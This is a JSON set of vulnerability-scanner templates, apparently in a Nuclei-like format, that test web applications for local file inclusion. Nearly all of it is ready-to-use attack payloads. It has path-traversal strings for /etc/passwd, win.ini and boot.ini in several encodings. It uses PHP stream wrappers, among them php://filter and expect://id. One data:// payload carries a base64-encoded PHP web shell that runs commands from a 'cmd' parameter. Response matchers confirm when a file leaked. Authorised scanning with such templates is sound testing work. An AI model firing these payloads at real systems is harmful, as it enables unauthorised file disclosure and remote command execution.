[
  {
    "id": "lfi-basic",
    "info": {
      "name": "Local File Inclusion - Basic Tests",
      "severity": "high",
      "category": "file-inclusion",
      "description": "Tests for local file inclusion vulnerabilities",
      "references": [
        "https://owasp.org/www-community/attacks/Path_Traversal"
      ],
      "tags": [
        "lfi",
        "file-inclusion",
        "path-traversal"
      ]
    },
    "payloads": [
      {
        "value": "../../etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "../../../etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "....//....//....//etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "/etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "file:///etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "....\\\\....\\\\....\\\\etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "..%2f..%2f..%2fetc%2fpasswd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "..%252f..%252f..%252fetc%252fpasswd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "php://filter/convert.base64-encode/resource=index.php",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "php://filter/read=string.rot13/resource=index.php",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "php://input",
        "encoding": "none",
        "method": "POST"
      },
      {
        "value": "expect://id",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "zip://archive.zip%23shell.php",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "phar://path/to/archive.phar/shell.php",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "/etc/passwd%00",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "/etc/passwd%00.jpg",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "../../../../../../../etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "....//....//....//....//....//....//....//etc/passwd",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "/var/www/../../etc/passwd",
        "encoding": "none",
        "method": "GET"
      }
    ],
    "matchers": [
      {
        "type": "response_body",
        "condition": "contains",
        "patterns": [
          "root:x:",
          "/bin/bash",
          "/bin/sh"
        ]
      }
    ]
  },
  {
    "id": "lfi-windows",
    "info": {
      "name": "Local File Inclusion - Windows",
      "severity": "high",
      "category": "file-inclusion",
      "description": "Tests for LFI on Windows systems",
      "references": [
        "https://owasp.org/www-community/attacks/Path_Traversal"
      ],
      "tags": [
        "lfi",
        "windows"
      ]
    },
    "payloads": [
      {
        "value": "..\\..\\..\\windows\\win.ini",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "C:\\windows\\win.ini",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "..\\..\\..\\boot.ini",
        "encoding": "none",
        "method": "GET"
      }
    ],
    "matchers": [
      {
        "type": "response_body",
        "condition": "contains",
        "patterns": [
          "[extensions]",
          "[fonts]",
          "boot loader"
        ]
      }
    ]
  }
]